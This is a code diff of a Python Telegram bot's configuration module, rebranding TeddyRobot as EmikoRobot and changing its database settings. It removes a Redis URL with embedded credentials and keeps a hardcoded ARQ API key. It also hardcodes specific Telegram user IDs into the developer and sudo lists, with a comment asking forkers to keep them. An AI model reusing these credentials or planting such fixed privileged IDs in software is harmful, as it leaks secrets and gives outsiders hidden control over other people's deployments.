@@ -18,7 +18,7 @@ from pyrogram.types import Message
 from pyrogram import Client, errors
 from pyrogram.errors.exceptions.bad_request_400 import PeerIdInvalid, ChannelInvalid
 from pyrogram.types import Chat, User
-from redis import StrictRedis
+from ptbcontrib.postgres_persistence import PostgresPersistence
 
 StartTime = time.time()
 
@@ -27,7 +27,7 @@ def get_user_list(__init__, key):
         return json.load(json_file)[key]
 
 # enable logging
-FORMAT = "[TeddyRobot] %(message)s"
+FORMAT = "[EmikoRobot] %(message)s"
 logging.basicConfig(
     handlers=[logging.FileHandler("log.txt"), logging.StreamHandler()],
     level=logging.INFO,
@@ -37,15 +37,15 @@ logging.basicConfig(
 logging.getLogger("pyrogram").setLevel(logging.INFO)
 logging.getLogger('ptbcontrib.postgres_persistence.postgrespersistence').setLevel(logging.WARNING)
 
-LOGGER = logging.getLogger('[TeddyRobot]')
-LOGGER.info("Teddy is starting. | Licensed under GPLv3.")
+LOGGER = logging.getLogger('[EmikoRobot]')
+LOGGER.info("Emiko is starting. | An Kennedy Project Parts. | Licensed under GPLv3.")
 LOGGER.info("Not affiliated to other anime or Villain in any way whatsoever.")
-LOGGER.info("Project maintained by: github.com/SuruXmanager (t.me/Chain_smoker_4r)")
+LOGGER.info("Project maintained by: github.com/kennedy-ex (t.me/excrybaby)")
 
 # if version < 3.9, stop bot.
-if sys.version_info[0] < 3 or sys.version_info[1] < 9:
+if sys.version_info[0] < 3 or sys.version_info[1] < 8:
     LOGGER.error(
-        "You MUST have a python version of at least 3.6! Multiple features depend on this. Bot quitting."
+        "You MUST have a python version of at least 3.8! Multiple features depend on this. Bot quitting."
     )
     sys.exit(1)
 
@@ -84,7 +84,6 @@ if ENV:
         raise Exception("Your tiger users list does not contain valid integers.")
 
     INFOPIC = bool(os.environ.get("INFOPIC", True))
-    BOT_USERNAME = os.environ.get("BOT_USERNAME", None)
     EVENT_LOGS = os.environ.get("EVENT_LOGS", None)
     WEBHOOK = bool(os.environ.get("WEBHOOK", False))
     URL = os.environ.get("URL", "")  # Does not contain token
@@ -121,11 +120,10 @@ if ENV:
     LASTFM_API_KEY = os.environ.get("LASTFM_API_KEY", None)
     CF_API_KEY = os.environ.get("CF_API_KEY", None)
     WELCOME_DELAY_KICK_SEC = os.environ.get("WELCOME_DELAY_KICL_SEC", None)
-    BOT_ID = int(os.environ.get("BOT_ID", None))
     ARQ_API_URL = os.environ.get("ARQ_API_URL", "https://arq.hamker.in")
     ARQ_API_KEY = os.environ.get("ARQ_API_KEY", "BCYKVF-KYQWFM-JCMORU-RZWOFQ-ARQ")
-    REDIS_URL = os.environ.get("REDIS_URL", "redis://Madharjoot:GuKhao123_@redis-12276.c275.us-east-1-4.ec2.cloud.redislabs.com:12276/Madharjoot")
-
+    MONGO_PORT = os.environ.get("MONGO_PORT")
+    MONGO_DB = os.environ.get("MONGO_DB", "Emiko")
     ALLOW_CHATS = os.environ.get("ALLOW_CHATS", True)
 
     try:
@@ -174,8 +172,8 @@ else:
     CERT_PATH = Config.CERT_PATH
     API_ID = Config.API_ID
     API_HASH = Config.API_HASH
-
-    DB_URL = Config._DATABASE_URL
+    MONGO_PORT = Config.MONGO_PORT
+    DB_URL = Config.SQLALCHEMY_DATABASE_URI
     MONGO_DB_URI = Config.MONGO_DB_URI
     ARQ_API_KEY = Config.ARQ_API_KEY
     ARQ_API_URL = Config.ARQ_API_URL
@@ -201,10 +199,10 @@ else:
     SPAMWATCH_API = Config.SPAMWATCH_API
     SESSION_STRING = Config.SESSION_STRING
     INFOPIC = Config.INFOPIC
-    BOT_USERNAME = Config.BOT_USERNAME
     STRING_SESSION = Config.STRING_SESSION
     LASTFM_API_KEY = Config.LASTFM_API_KEY
     CF_API_KEY = Config.CF_API_KEY
+    MONGO_DB = Config.MONGO_DB
 
     try:
         BL_CHATS = {int(x) for x in Config.BL_CHATS or []}
@@ -214,29 +212,9 @@ else:
 # If you forking dont remove this id, just add your id. LOL...
 
 DRAGONS.add(OWNER_ID)
-DRAGONS.add(5440061462)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(5440061462)
-DEV_USERS.add(5440061462)
-
-REDIS = StrictRedis.from_url(REDIS_URL, decode_responses=True)
-
-try:
-
-    REDIS.ping()
-
-    LOGGER.info("[TEDDY]: Connecting to redis")
-except BaseException:
-
-    raise Exception("[TEDDY ERROR]: Redis Database Is Not Alive, Please Check Again.")
-
-finally:
-
-   REDIS.ping()
-
-   LOGGER.info("[TEDDY]: Connection to Redis Database Established Successfully!")
-    
-
+DEV_USERS.add(2137482758)
+DEV_USERS.add(1866066766)
 
 if not SPAMWATCH_API:
     sw = None
@@ -259,6 +237,10 @@ aiohttpsession = ClientSession()
 # ARQ Client
 print("[INFO]: INITIALIZING ARQ CLIENT")
 arq = ARQ(ARQ_API_URL, ARQ_API_KEY, aiohttpsession)
+
+BOT_ID = dispatcher.bot.id
+BOT_USERNAME = dispatcher.bot.username
+BOT_NAME = dispatcher.bot.first_name
 
 ubot2 = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)
 try:
